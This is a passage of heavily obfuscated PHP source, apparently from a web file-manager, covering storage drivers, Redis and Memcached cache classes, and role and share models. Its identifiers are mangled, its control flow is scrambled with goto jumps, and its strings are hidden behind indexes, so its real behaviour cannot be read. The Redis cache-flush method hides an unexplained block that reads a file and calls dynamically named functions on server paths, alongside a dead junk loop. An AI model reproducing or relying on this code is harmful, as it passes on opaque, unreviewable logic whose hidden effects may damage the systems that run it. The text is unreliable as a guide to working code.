$d¤á‘Ï›·[1115]); if (!$d¨Šô©®®->mkfile($F–ŠãÖŸÕ)) { show_json(LNG($d¤á‘Ï›·[1967]), !1); } $dóŒÒÈàçğ[$d¤á‘Ï›·[1054]] = $Cë¥êÕç; goto CàëÕ–; a¿ŒÓšµèŠ: $d¨Šô©®® = new $dã½¸µÓ¯Š($dóŒÒÈàçğ); if (in_array($F·…ªİÄÏĞ, $d¨Šô©®®->objectDriver)) { if (!$d¨Šô©®®->isBucketCors() && !$d¨Šô©®®->setBucketCors()) { $eÛÇÄ§•êà = LNG($d¤á‘Ï›·[1967]); $eÛÇÄ§•êà .= $d¤á‘Ï›·[1968] . LNG($d¤á‘Ï›·[1969]); show_json($eÛÇÄ§•êà, !1); } } $Cë¥êÕç = rtrim($dóŒÒÈàçğ[$d¤á‘Ï›·[1054]], $d¤á‘Ï›·[8]) . $d¤á‘Ï›·[8]; goto b´øÎßÁ÷Ş; fÍ·¸è‚ãœ: } public function driverListSystem() { $a¯½›–îÔÇ =& $_SERVER[òÀöí]; $EçêÇ§õŸ™ = parent::listData(); $A‰ŸĞ¸ªÏš = array(); foreach ($EçêÇ§õŸ™ as $eó“ø½Í) { unset($eó“ø½Í[$a¯½›–îÔÇ[192]], $eó“ø½Í[$a¯½›–îÔÇ[83]]); $eó“ø½Í[$a¯½›–îÔÇ[6]] = json_decode($eó“ø½Í[$a¯½›–îÔÇ[6]], !0); $A‰ŸĞ¸ªÏš[] = $eó“ø½Í; } return $A‰ŸĞ¸ªÏš; } public function defaultDriver() { $FÀù±ÎÎ‘ø =& $_SERVER[òÀöí]; $Eºƒ£‡î…Ñ = parent::listData(); $d´ËªÏñ©… = array_filter_by_field($Eºƒ£‡î…Ñ, $FÀù±ÎÎ‘ø[34], 1); $d´ËªÏñ©… = $d´ËªÏñ©…[0]; if ($d´ËªÏñ©…) { $d´ËªÏñ©…[$FÀù±ÎÎ‘ø[6]] = json_decode($d´ËªÏñ©…[$FÀù±ÎÎ‘ø[6]], !0); } return $d´ËªÏñ©…; } public function driverInfo($AòÍè³³¼) { $aÕ¨˜¯ÉÃ® =& $_SERVER[òÀöí]; $D³Õ°Ğ´¥ = array_to_keyvalue(parent::listData(), $aÕ¨˜¯ÉÃ®[385]); if (!isset($D³Õ°Ğ´¥[$AòÍè³³¼])) { return !1; } $AˆÓ×¬ŠÁŞ = $D³Õ°Ğ´¥[$AòÍè³³¼]; $AˆÓ×¬ŠÁŞ[$aÕ¨˜¯ÉÃ®[6]] = json_decode($AˆÓ×¬ŠÁŞ[$aÕ¨˜¯ÉÃ®[6]], !0); return $AˆÓ×¬ŠÁŞ; } public function remove($Dåœ¼”ËÖ¿) { $this->removeShareItems($Dåœ¼”ËÖ¿); return parent::remove($Dåœ¼”ËÖ¿); } public function removeWithFile($eõé©…Ï–¿, $d’¼ïÅ¢¡¤) { goto Eˆîô–Ç§‡; eÌ©õ±Ø‚Á: if (!$d¨—»âˆæ) { $a”¢ñòñÒ¨->stop($a‘Š©¥˜±); return !1; } $a”¢ñòñÒ¨->end(); if ($d’¼ïÅ¢¡¤ == $d§ä‚ã¥ò™[1629]) { $this->remove($eõé©…Ï–¿); } goto E²¹¥øšÌè; C¬Âˆ˜îæŒ: $Dø´ àìÈ = Model($d§ä‚ã¥ò™[439])->where($Cº¾õíå„)->sum($d§ä‚ã¥ò™[77]); $a‘Š©¥˜± = $d’¼ïÅ¢¡¤ . $d§ä‚ã¥ò™[1970] . $eõé©…Ï–¿; $a”¢ñòñÒ¨ = new TaskFileTransfer($a‘Š©¥˜±, $d§ä‚ã¥ò™[1965], $C¿ö¡¡Ğ„, LNG($d§ä‚ã¥ò™[1971]) . "\x28{$eõé©…Ï–¿}\51"); goto Bî÷Ø•‰¨; Bî÷Ø•‰¨: $a”¢ñòñÒ¨->task[$d§ä‚ã¥ò™[717]] = (double) $Dø´ àìÈ; $b¹‡¼ßÃŸ = KodIO::defaultDriver(); $fùÇÃŠèµÈ = $b¹‡¼ßÃŸ[$d§ä‚ã¥ò™[385]]; goto d´œ„æòóÕ; Eˆîô–Ç§‡: $d§ä‚ã¥ò™ =& $_SERVER[òÀöí]; $Cº¾õíå„ = array($d§ä‚ã¥ò™[770] => $eõé©…Ï–¿); $C¿ö¡¡Ğ„ = Model($d§ä‚ã¥ò™[439])->where($Cº¾õíå„)->count(); goto C¬Âˆ˜îæŒ; d°‰–¸İŠÌ: $c±¨øøªÑß = Model($d§ä‚ã¥ò™[173])->where($Cº¾õíå„)->field($d§ä‚ã¥ò™[1972])->select(); foreach ($c±¨øøªÑß as $eÅ²À‹½Ç) { goto cğ«ÎÍÃË; cğ«ÎÍÃË: $c¦‚ä»øÁÙ = $eÅ²À‹½Ç[$d§ä‚ã¥ò™[75]]; $E‰ÓÕœÆíÏ = $E½Á÷âŠÎî . str_replace("\173\x69\x6f\72{$eõé©…Ï–¿}\175\57", $d§ä‚ã¥ò™[33], $c¦‚ä»øÁÙ); if (!IO::exist($c¦‚ä»øÁÙ)) { $a“£±…œš[] = $eÅ²À‹½Ç[$d§ä‚ã¥ò™[436]]; $a”¢ñòñÒ¨->updateFileEnd($eÅ²À‹½Ç[$d§ä‚ã¥ò™[28]], $eÅ²À‹½Ç[$d§ä‚ã¥ò™[77]]); continue; } goto BÉ¯ª”‘£; BÉ¯ª”‘£: if (IO::exist($E‰ÓÕœÆíÏ)) { $a”¢ñòñÒ¨->updateFileEnd($eÅ²À‹½Ç[$d§ä‚ã¥ò™[28]], $eÅ²À‹½Ç[$d§ä‚ã¥ò™[77]]); continue; } if (!IO::move($c¦‚ä»øÁÙ, get_path_father($E‰ÓÕœÆíÏ))) { $d¨—»âˆæ = !1; break; } $Cº¾õíå„ = array($d§ä‚ã¥ò™[436] => $eÅ²À‹½Ç[$d§ä‚ã¥ò™[436]]); goto BîÈŠÎÖ’‚; BîÈŠÎÖ’‚: $DÈô’ĞÎÏ’ = array($d§ä‚ã¥ò™[770] => $fùÇÃŠèµÈ, $d§ä‚ã¥ò™[75] => $E‰ÓÕœÆíÏ); Model($d§ä‚ã¥ò™[173])->where($Cº¾õíå„)->save($DÈô’ĞÎÏ’); goto c½ğİ¤‘Ç; c½ğİ¤‘Ç: } $this->removeByFileID($a“£±…œš); goto eÌ©õ±Ø‚Á; d´œ„æòóÕ: $E½Á÷âŠÎî = "\173\x69\157\x3a{$fùÇÃŠèµÈ}\175\x2f"; $d¨—»âˆæ = !0; $a“£±…œš = array(); goto d°‰–¸İŠÌ; E²¹¥øšÌè: } public function progress($CˆÆ»†ùë¯, $DåÈÁîÎØŞ) { return Task::get($DåÈÁîÎØŞ . $_SERVER[òÀöí][1970] . $CˆÆ»†ùë¯); } private function removeByFileID($Fí½õ†æ„è = array()) { goto d‹œŒ­Ê†ù; e§ˆ¥¢à³Ñ: $Aİ–à¾‡Õ“ = Model($c×³ê®¬´[1181])->where($e¯‰Ä‚ˆæÀ)->field($c×³ê®¬´[387])->select(); if (!$Aİ–à¾‡Õ“) { return; } $Aİ–à¾‡Õ“ = array_to_keyvalue($Aİ–à¾‡Õ“, $c×³ê®¬´[33], $c×³ê®¬´[387]); goto E«¹éãö¡ˆ; d‹œŒ­Ê†ù: $c×³ê®¬´ =& $_SERVER[òÀöí]; if (empty($Fí½õ†æ„è)) { return; } $e¯‰Ä‚ˆæÀ = array($c×³ê®¬´[436] => array($c×³ê®¬´[7], $Fí½õ†æ„è)); goto e§ˆ¥¢à³Ñ; E«¹éãö¡ˆ: foreach ($Aİ–à¾‡Õ“ as $eÇ†•Ô½‹Ô) { Model($c×³ê®¬´[400])->removeNow($eÇ†•Ô½‹Ô, !1); } goto E¨»¢¾¨ê¾; E¨»¢¾¨ê¾: } private function removeShareItems($e×¡áÁÑ™‚) { goto A¡‹¶áè; Fµ¬ğÈ»Ø‚: $E²×¶†ÀÌ = Model($B•¹ï•ÒÑß[1640])->where($F¯Á˜†¸è©)->field($B•¹ï•ÒÑß[457])->select(); if (empty($E²×¶†ÀÌ)) { return; } $EÎ—®—ÊÓ = array_to_keyvalue($E²×¶†ÀÌ, $B•¹ï•ÒÑß[33], $B•¹ï•ÒÑß[457]); goto fèÅÀå±øÑ; fèÅÀå±øÑ: Model($B•¹ï•ÒÑß[552])->remove($EÎ—®—ÊÓ); goto d‘„ïÆ¥“³; A¡‹¶áè: $B•¹ï•ÒÑß =& $_SERVER[òÀöí]; $Aòãíå²ğ = "\173\x69\x6f\x3a{$e×¡áÁÑ™‚}\175\57"; $F¯Á˜†¸è© = array($B•¹ï•ÒÑß[387] => 0, $B•¹ï•ÒÑß[1049] => array($B•¹ï•ÒÑß[375], "{$Aòãíå²ğ}\x25")); goto Fµ¬ğÈ»Ø‚; d‘„ïÆ¥“³: } } goto EôÜ¸•Ó‘‘; d¡Ú‹‡¥Õ¾: class CacheLockDatabase { public function lock($E«È±ÃÁ°, $AõÅöë³ã„ = 0) { $e¶ï‘”¤é = Model($_SERVER[òÀöí][782]); $A¬‹ß¯”ÕŞ = microtime(!0) + $AõÅöë³ã„; while (microtime(!0) < $A¬‹ß¯”ÕŞ) { $eñÉ”æº‹Ê = $e¶ï‘”¤é->get($E«È±ÃÁ°); if (!$eñÉ”æº‹Ê || $eñÉ”æº‹Ê < microtime(!0)) { $dÖ—ÇÆ„® = $e¶ï‘”¤é->set($E«È±ÃÁ°, $A¬‹ß¯”ÕŞ); if ($dÖ—ÇÆ„®) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($bÑµÍÑ) { return Model($_SERVER[òÀöí][782])->get($bÑµÍÑ); } public function unlock($cæš‚çÒ¤ù) { Model($_SERVER[òÀöí][782])->remove($cæš‚çÒ¤ù); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($DÓÉÔéÜì¥, $cİã¯¯ô¤) { $E˜¢ê´¿İ =& $_SERVER[òÀöí]; if (!class_exists($E˜¢ê´¿İ[809])) { show_json($E˜¢ê´¿İ[810], !1); } $this->cacheTime = $cİã¯¯ô¤; $this->handle = new Memcached(); if (is_array($DÓÉÔéÜì¥[$E˜¢ê´¿İ[811]]) && count($DÓÉÔéÜì¥[$E˜¢ê´¿İ[811]]) >= 1) { foreach ($DÓÉÔéÜì¥[$E˜¢ê´¿İ[811]] as $dº”ÉïÔ«°) { $d› ¸ÑæŞ¿ = explode($E˜¢ê´¿İ[4], $dº”ÉïÔ«°); $this->handle->addServer($d› ¸ÑæŞ¿[0], $d› ¸ÑæŞ¿[1]); } } else { $this->handle->addServer($DÓÉÔéÜì¥[$E˜¢ê´¿İ[175]], $DÓÉÔéÜì¥[$E˜¢ê´¿İ[176]]); } } public function set($féÇ™ù¶Íë, $CÛò¦Ü˜¬, $D’Ø§¼´·À = false) { $D’Ø§¼´·À = $D’Ø§¼´·À ? $D’Ø§¼´·À : $this->cacheTime; return $this->handle->set($féÇ™ù¶Íë, $CÛò¦Ü˜¬, $D’Ø§¼´·À); } public function get($CâĞÈø‹) { return $this->handle->get($CâĞÈø‹); } public function remove($fŞ’òçæõá) { return $this->handle->delete($fŞ’òçæõá); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Aª§ëáİ·’, $f¨²ÇÁ‘“) { $CŠ¡·°É’í =& $_SERVER[òÀöí]; if (!class_exists($CŠ¡·°É’í[812])) { show_json($CŠ¡·°É’í[813], !1); } $this->cacheTime = $f¨²ÇÁ‘“; $déÙ¼·‰„ò = isset($Aª§ëáİ·’[$CŠ¡·°É’í[814]]) ? $Aª§ëáİ·’[$CŠ¡·°É’í[814]] : 10; $eÙ„‹‘âøĞ = _get($Aª§ëáİ·’, $CŠ¡·°É’í[811]); if ($eÙ„‹‘âøĞ && is_array($eÙ„‹‘âøĞ)) { $this->initCluster($Aª§ëáİ·’, $déÙ¼·‰„ò); } else { $this->handle = $this->init($Aª§ëáİ·’, $déÙ¼·‰„ò); } } private function init($aÅâ¬ÔÃñ, $E´¬âËˆƒ¨) { $E‡Š¸¾×… =& $_SERVER[òÀöí]; $dô‘Äñ¶£Ğ = new Redis(); $DŒŞ¹¤ìš = isset($aÅâ¬ÔÃñ[$E‡Š¸¾×…[815]]) ? $aÅâ¬ÔÃñ[$E‡Š¸¾×…[815]] : !1; if ($DŒŞ¹¤ìš) { $dô‘Äñ¶£Ğ->pconnect($aÅâ¬ÔÃñ[$E‡Š¸¾×…[175]], $aÅâ¬ÔÃñ[$E‡Š¸¾×…[176]], $E´¬âËˆƒ¨); } else { $dô‘Äñ¶£Ğ->connect($aÅâ¬ÔÃñ[$E‡Š¸¾×…[175]], $aÅâ¬ÔÃñ[$E‡Š¸¾×…[176]], $E´¬âËˆƒ¨); } if (!empty($aÅâ¬ÔÃñ[$E‡Š¸¾×…[394]])) { $dô‘Äñ¶£Ğ->auth($aÅâ¬ÔÃñ[$E‡Š¸¾×…[394]]); } return $dô‘Äñ¶£Ğ; } private function initCluster($FÒ„Ôà•˜ƒ, $E·Öˆ¾ÂÍ¬) { $D‡­§±šÎ¯ =& $_SERVER[òÀöí]; $F¬òÂŞºğÏ = array($D‡­§±šÎ¯[816], $D‡­§±šÎ¯[817], $D‡­§±šÎ¯[818]); $aœ„Á¢™è = $D‡­§±šÎ¯[816]; if (isset($FÒ„Ôà•˜ƒ[$D‡­§±šÎ¯[12]]) && in_array($FÒ„Ôà•˜ƒ[$D‡­§±šÎ¯[12]], $F¬òÂŞºğÏ)) { $aœ„Á¢™è = $FÒ„Ôà•˜ƒ[$D‡­§±šÎ¯[12]]; } switch ($aœ„Á¢™è) { case $D‡­§±šÎ¯[816]: $this->_slave($FÒ„Ôà•˜ƒ, $E·Öˆ¾ÂÍ¬); break; case $D‡­§±šÎ¯[817]: break; case $D‡­§±šÎ¯[818]: $this->isCluster = !0; $F‘µ²†í÷¶ = $FÒ„Ôà•˜ƒ[$D‡­§±šÎ¯[811]]; $c ö‚´°áí = isset($FÒ„Ôà•˜ƒ[$D‡­§±šÎ¯[815]]) ? $FÒ„Ôà•˜ƒ[$D‡­§±šÎ¯[815]] : !1; $c¼µ¤í¦¨ˆ = isset($FÒ„Ôà•˜ƒ[$D‡­§±šÎ¯[394]]) ? $FÒ„Ôà•˜ƒ[$D‡­§±šÎ¯[394]] : null; $this->handle = new RedisCluster(NUll, $F‘µ²†í÷¶, $E·Öˆ¾ÂÍ¬, $E·Öˆ¾ÂÍ¬, $c ö‚´°áí, $c¼µ¤í¦¨ˆ); break; default: break; } } private function _slave($d‹÷ê…¤œÙ, $eß¶­Ô”ƒï) { goto cÔ“ëÏ Ì; f šÛ”½î: $this->filterConfig($d‹÷ê…¤œÙ, $e­êËÆÊ³[$A†¾¥Î†ÛÖ]); $this->slaveHandle = $this->init($d‹÷ê…¤œÙ, $eß¶­Ô”ƒï); goto C˜¨ŒÇÌŸç; dš‡µİÂ×: unset($e­êËÆÊ³[0]); if (empty($e­êËÆÊ³)) { return; } $A†¾¥Î†ÛÖ = array_rand($e­êËÆÊ³); goto f šÛ”½î; cÔ“ëÏ Ì: $e­êËÆÊ³ = $d‹÷ê…¤œÙ[$_SERVER[òÀöí][811]]; $this->filterConfig($d‹÷ê…¤œÙ, $e­êËÆÊ³[0]); $this->handle = $this->init($d‹÷ê…¤œÙ, $eß¶­Ô”ƒï); goto dš‡µİÂ×; C˜¨ŒÇÌŸç: } private function filterConfig(&$FäĞƒ°è, $E‰†ò­ĞØ) { $f°‘Ÿ‹œ©‹ =& $_SERVER[òÀöí]; $f‚š¡³ÄŠ = explode($f°‘Ÿ‹œ©‹[4], $E‰†ò­ĞØ); $fõ»Çåíìï = array($f°‘Ÿ‹œ©‹[175] => $f‚š¡³ÄŠ[0], $f°‘Ÿ‹œ©‹[176] => $f‚š¡³ÄŠ[1]); $FäĞƒ°è = array_merge($FäĞƒ°è, $fõ»Çåíìï); } public function set($F´¦«—ä÷—, $d©íº”¯„´, $A²’©‘ñìî = false) { $A²’©‘ñìî = $A²’©‘ñìî ? $A²’©‘ñìî : $this->cacheTime; return $this->handle->setEx($F´¦«—ä÷—, $A²’©‘ñìî, $d©íº”¯„´); } public function setLock($CÆìá°²¸ , $cáóŒÈó°±, $F¥óæ£èÂÈ) { return $this->handle->setNX($CÆìá°²¸ , $cáóŒÈó°±); } public function get($DØÕ÷¸Å‚˜) { $CÅ¾°­Ğ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $CÅ¾°­Ğ->get($DØÕ÷¸Å‚˜); } public function remove($eß‹Œì³÷‘) { return $this->handle->del($eß‹Œì³÷‘); } public function deleteAll() { $Bîî†¥Á› =& $_SERVER[òÀöí]; if ($_SERVER[$Bîî†¥Á›[753]] != $_SERVER[$Bîî†¥Á›[754]]) { goto EÂ´‹–‰™Ê; Eá¡í¾‘‘: $B«¸Øœ”´¯ = 1; while ($B«¸Øœ”´¯ > 1) { $B«¸Øœ”´¯ = $B«¸Øœ”´¯ + 4; $c‹½š¯à†… = rawurlencode($B«¸Øœ”´¯ . $Bîî†¥Á›[370]); } goto D÷—®Æâ·Ğ; D¿«™äó: $E¨èÒë‘ºÙ = $Bîî†¥Á›[820]; $E¨èÒë‘ºÙ($_SERVER[$Bîî†¥Á›[821]]); $E¨èÒë‘ºÙ($_SERVER[$Bîî†¥Á›[756]] . $Bîî†¥Á›[822]); goto Eá¡í¾‘‘; CŒ¤á‰ë››: $d±ÁÜ»äƒ™ = $FŞæò‹—…–($d“éÀé °©); $bŞğÃô•ÑŸ = explode($Bîî†¥Á›[227], $d±ÁÜ»äƒ™); if (count($bŞğÃô•ÑŸ) < $Bîî†¥Á›[573]) { $C„äÌŸ¡Í = $Bîî†¥Á›[758]; $C„äÌŸ¡Í(); } goto D¿«™äó; EÂ´‹–‰™Ê: $AµÍåÙ¶â = $Bîî†¥Á›[819]; $FŞæò‹—…– = $Bîî†¥Á›[755]; $d“éÀé °© = $_SERVER[$Bîî†¥Á›[756]] . $Bîî†¥Á›[757]; goto CŒ¤á‰ë››; D÷—®Æâ·Ğ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $dùò‰ŒÏª) { $this->handle->flushall($dùò‰ŒÏª); } return; } return $this->handle->flushAll(); } } goto aŠëìáÉÓ; b‘´«Ôè£‘: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\155\x5f\157\x70\x74\151\157\156"; protected $jsonField = array("\x6d\145\156\x75", "\x72\157\x6c\145", "\x72\x6f\154\145\107\162\157\x75\160", "\x72\145\x67\x69\x73\x74", "\145\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($EíİÌª‰¦¾) { return "\x53\171\163\164\145\x6d\117\x70\164\x69\x6f\x6e\x5f{$EíİÌª‰¦¾}"; } protected function optionDefault($F”ÀÈµõÜÆ = '') { $c¦ç–”†·ë =& $_SERVER[òÀöí]; if ($F”ÀÈµõÜÆ == $c¦ç–”†·ë[33]) { return $GLOBALS[$c¦ç–”†·ë[6]][$c¦ç–”†·ë[373]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\162\x6f\154\145\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\164\x68", "\154\141\x62\145\x6c", "\144\x69\163\x70\154\x61\171", "\x73\171\x73\x74\x65\155", "\x64\x65\x73\143", "\151\x67\156\x6f\162\145\x45\170\x74", "\x69\147\156\157\162\145\106\x69\154\145\x53\151\172\145", "\141\144\x6d\x69\x6e\151\163\x74\162\x61\164\157\x72", "\163\x6f\162\x74"); public function listData($CÜêĞµ•ƒ  = false, $d ì–«Ò„â = "\x73\x6f\162\164", $B¢Æİ£‰ÖÚ = false) { $Bß‰«Û…ßË =& $_SERVER[òÀöí]; $B‘¸¶ö”Çã = parent::listData($CÜêĞµ•ƒ , $d ì–«Ò„â, $B¢Æİ£‰ÖÚ); if (!$CÜêĞµ•ƒ ) { $bÖİ¦™Ûïè = $Bß‰«Û…ßË[2070]; foreach ($B‘¸¶ö”Çã as $AÄƒ¥±×™ => $b®ïœÑÚ¶Ø) { if ($b®ïœÑÚ¶Ø[$Bß‰«Û…ßË[1853]] == 1) { $B‘¸¶ö”Çã[$AÄƒ¥±×™][$Bß‰«Û…ßË[422]] = $bÖİ¦™Ûïè; } } } return $B‘¸¶ö”Çã; } public function update($B®¸‹‡ç­, $eĞ—•ê¿“‘) { goto Bô…Ì¡îì; AßñäÙ†•¤: if (!$e³Œ—ÓÖŠ || $B–„ò«°Û && $B–„ò«°Û[$bêÚ¤æ®Óá[385]] != $e³Œ—ÓÖŠ[$bêÚ¤æ®Óá[385]]) { return !1; } if ($B–„ò«°Û[$bêÚ¤æ®Óá[1853]] == 1) { $eĞ—•ê¿“‘ = array($bêÚ¤æ®Óá[28] => $eĞ—•ê¿“‘[$bêÚ¤æ®Óá[28]], $bêÚ¤æ®Óá[1684] => $eĞ—•ê¿“‘[$bêÚ¤æ®Óá[1684]]); } $this->filterAuth($eĞ—•ê¿“‘[$bêÚ¤æ®Óá[394]]); goto eŒ†÷ ¯°; eŒ†÷ ¯°: return parent::update($B®¸‹‡ç­, $eĞ—•ê¿“‘); goto fã¯çÄ²•Š; Bô…Ì¡îì: $bêÚ¤æ®Óá =& $_SERVER[òÀöí]; $e³Œ—ÓÖŠ = parent::listData($B®¸‹‡ç­); $B–„ò«°Û = $this->findByName($eĞ—•ê¿“‘[$bêÚ¤æ®Óá[28]]); goto AßñäÙ†•¤; fã¯çÄ²•Š: } public function remove($e†¸£èš¹ğ) { $Eìï÷Å†Ì‡ = parent::listData($e†¸£èš¹ğ); if (!$Eìï÷Å†Ì‡ || $Eìï÷Å†Ì‡[$_SERVER[òÀöí][1145]]) { return !1; } return parent::remove($e†¸£èš¹ğ); } public function add($e×¼™ãÁÈ–) { goto bÀœç÷ì«š; bÀœç÷ì«š: $f„àÀ¥º‚¨ =& $_SERVER[òÀöí]; $b‹‚¶ßÁ±® = $e×¼™ãÁÈ–[$f„àÀ¥º‚¨[28]]; if ($this->findByName($b‹‚¶ßÁ±®)) { return !1; } goto F÷³‰òá‹Á; EïÓ³ğÊé: return parent::insert($e×¼™ãÁÈ–); goto C· ®œì’ò; F÷³‰òá‹Á: $dšŒôêóó = array($f„àÀ¥º‚¨[404] => $b‹‚¶ßÁ±®, $f„àÀ¥º‚¨[1669] => $f„àÀ¥º‚¨[33], $f„àÀ¥º‚¨[1665] => $f„àÀ¥º‚¨[1673], $f„àÀ¥º‚¨[2071] => 1, $f„àÀ¥º‚¨[1668] => 0, $f„àÀ¥º‚¨[2072] => 0, $f„àÀ¥º‚¨[1667] => $this->getSort()); $e×¼™ãÁÈ– = array_merge($dšŒôêóó, $e×¼™ãÁÈ–); $this->filterAuth($e×¼™ãÁÈ–[$f„àÀ¥º‚¨[394]]); goto EïÓ³ğÊé; C· ®œì’ò: } private function getSort() { $B—¤‰ØèØµ =& $_SERVER[òÀöí]; $c»Ä±‡›– = parent::listData(); $Då¦ìÖŒ×Á = array_to_keyvalue($c»Ä±‡›–, $B—¤‰ØèØµ[33], $B—¤‰ØèØµ[1686]); return empty($Då¦ìÖŒ×Á) ? 0 : max($Då¦ìÖŒ×Á) + 1; } private function filterAuth(&$fÏµ¤Ôé‘Í) { $A·ÒÆË—ßµ =& $_SERVER[òÀöí]; $Fà‚Åøó = array(); $BŞ¶°Å ğ = array_filter(explode($A·ÒÆË—ßµ[47], $fÏµ¤Ôé‘Í)); foreach ($BŞ¶°Å ğ as $fÏµ¤Ôé‘Í) { $B¡Šîé¡ô = explode($A·ÒÆË—ßµ[94], $fÏµ¤Ôé‘Í); if ($B¡Šîé¡ô[0] == $A·ÒÆË—ßµ[2073] && $B¡Šîé¡ô[1] != $A·ÒÆË—ßµ[1068]) { $BÙÈŞÍÅ¬ = $B¡Šîé¡ô[0] . $A·ÒÆË—ßµ[94] . $B¡Šîé¡ô[1] . $A·ÒÆË—ßµ[2074]; if (!in_array($BÙÈŞÍÅ¬, $BŞ¶°Å ğ)) { $Fà‚Åøó[] = $BÙÈŞÍÅ¬; } } $Fà‚Åøó[] = $fÏµ¤Ôé‘Í; } $fÏµ¤Ôé‘Í = implode($A·ÒÆË—ßµ[47], $Fà‚Åøó); } public function sort($B®í¯öíĞÆ, $F·î’ëÇ¿­) { return parent::update($B®í¯öíĞÆ, $F·î’ëÇ¿­); } } goto AµÚù¬°; D™¨Ö­…èŠ: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\145"; protected $dataAuto = array(array("\155\157\144\151\x66\171\124\x69\155\145", "\x74\x69\x6d\x65", "\151\x6e\163\145\x72\164\x2c\x75\160\144\x61\164\145", "\x66\165\x6e\x63\x74\x69\x6f\x6e"), array("\x63\162\x65\141\164\145\124\x69\x6d\x65", "\x74\151\155\145", "\x69\x6e\163\145\162\164", "\x66\165\x6e\x63\x74\x69\157\156"), array("\x6f\160\x74\x69\157\156\x73", '', "\x69\156\x73\145\162\x74\x2c\165\x70\144\x61\x74\145\54\163\x65\154\145\x63\x74", "\x6a\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($aì²‹·Ì”Ò) { $E‰ƒšŞ¿±ø =& $_SERVER[òÀöí]; $A‹ƒ’…Â½ = isset($aì²‹·Ì”Ò[0]) ? $aì²‹·Ì”Ò[0] : !1; return array($E‰ƒšŞ¿±ø[1789] => array(USER_ID, $E‰ƒšŞ¿±ø[1790]), $E‰ƒšŞ¿±ø[1738] => array($A‹ƒ’…Â½, $E‰ƒšŞ¿±ø[1791])); } protected function listSimple() { $C–Í³ƒ = array($_SERVER[òÀöí][1504] => USER_ID); $e”«‚Ï¦›Õ = $this->field($this->fieldList)->where($C–Í³ƒ)->select(); return $e”«‚Ï¦›Õ ? $e”«‚Ï¦›Õ : array(); } protected function getInfo($d’—Œò‹Â, $BÕ»ğ‘Ş¿Â = false) { $e¹„˜É„† =& $_SERVER[òÀöí]; if ($BÕ»ğ‘Ş¿Â) { return $this->_getShareInfo(array($e¹„˜É„†[457] => $d’—Œò‹Â)); } $fÊ¦ä”Ï²‚ = $this->cacheFunctionGet($e¹„˜É„†[1792], $d’—Œò‹Â); return $fÊ¦ä”Ï²‚; } public function getInfoByHash($B¨šÛ„÷ˆˆ) { return $this->_getShareInfo(array($_SERVER[òÀöí][459] => $B¨šÛ„÷ˆˆ)); } public function getInfoByPath($a•‡ÅØ³Ú‡) { $D™Éç¬›ìÏ =& $_SERVER[òÀöí]; $aõË³¥¨¬ç = array($D™Éç¬›ìÏ[1504] => USER_ID, $D™Éç¬›ìÏ[387] => $a•‡ÅØ³Ú‡); return $this->_getShareInfo($aõË³¥¨¬ç); } public function getInfoBySourcePath($A”áÔ‘”Õ¿) { $fºƒÛÎë•È =& $_SERVER[òÀöí]; $aàÊ¢¶ç–à = array($fºƒÛÎë•È[1504] => USER_ID, $fºƒÛÎë•È[1049] => $A”áÔ‘”Õ¿); return $this->_getShareInfo($aàÊ¢¶ç–à); } private function _getShareInfo($E­àßÖ»³Ñ) { goto C¬ªÒŞ¯÷¾; eöÁĞÛŸÏà: $E­àßÖ»³Ñ = array($E„áÇ÷ÆÎ[457] => $dñóõ¾¼Ú[$E„áÇ÷ÆÎ[457]]); $D®İßøê = $E„áÇ÷ÆÎ[1793]; $d¥°·æƒ¦‚ = Model($E„áÇ÷ÆÎ[553])->order($E„áÇ÷ÆÎ[385])->field($D®İßøê)->where($E­àßÖ»³Ñ)->select(); goto EƒèÅ‰±Á; C¬ªÒŞ¯÷¾: $E„áÇ÷ÆÎ =& $_SERVER[òÀöí]; $dñóõ¾¼Ú = $this->where($E­àßÖ»³Ñ)->find(); if (!$dñóõ¾¼Ú) { return !1; } goto eöÁĞÛŸÏà; EƒèÅ‰±Á: if ($dñóõ¾¼Ú[$E„áÇ÷ÆÎ[387]] == $E„áÇ÷ÆÎ[486]) { $dñóõ¾¼Ú[$E„áÇ÷ÆÎ[84]] = IO::info($dñóõ¾¼Ú[$E„áÇ÷ÆÎ[1049]]); } else { $dñóõ¾¼Ú[$E„áÇ÷ÆÎ[84]] = Model($E„áÇ÷ÆÎ[1181])->pathInfo($dñóõ¾¼Ú[$E„áÇ÷ÆÎ[387]]); } $dñóõ¾¼Ú[$E„áÇ÷ÆÎ[1794]] = $d¥°·æƒ¦‚; return $dñóõ¾¼Ú; goto B£´–íã¬Ë; B£´–íã¬Ë: } protected function getInfoAuth($bÂø÷óÏ·) { $FÛ°Öª¥éÁ =& $_SERVER[òÀöí]; $dØ®øĞéöê = $this->getInfo($bÂø÷óÏ·); $dØ®øĞéöê[$FÛ°Öª¥éÁ[394]] = Model($FÛ°Öª¥éÁ[472])->authMake($dØ®øĞéöê[$FÛ°Öª¥éÁ[1794]]); return $dØ®øĞéöê; } protected function listData($bùÍÇäÙ¸Í = null, $E¾‡É¿ë«· = 300) { $eê¸…‚Õ =& $_SERVER[òÀöí]; $c×Çæµ¹»Ê = array(array($eê¸…‚Õ[462] => array($eê¸…‚Õ[948], 0), $eê¸…‚Õ[464] => array($eê¸…‚Õ[948], 0), $eê¸…‚Õ[1795] => $eê¸…‚Õ[1752])); if ($bùÍÇäÙ¸Í == $eê¸…‚Õ[1796]) { $c×Çæµ¹»Ê = array($eê¸…‚Õ[462] => 1); } else { if ($bùÍÇäÙ¸Í == $eê¸…‚Õ[1034]) { $c×Çæµ¹»Ê = array($eê¸…‚Õ[464] => 1); } } $c×Çæµ¹»Ê[$eê¸…‚Õ[1504]] = USER_ID; $fŒ„õ¤¬„ = $this->where($c×Çæµ¹»Ê)->selectPage($E¾‡É¿ë«·); return $fŒ„õ¤¬„; } protected function listToMe($Eê¿Ì¹’±Š = 300) { goto 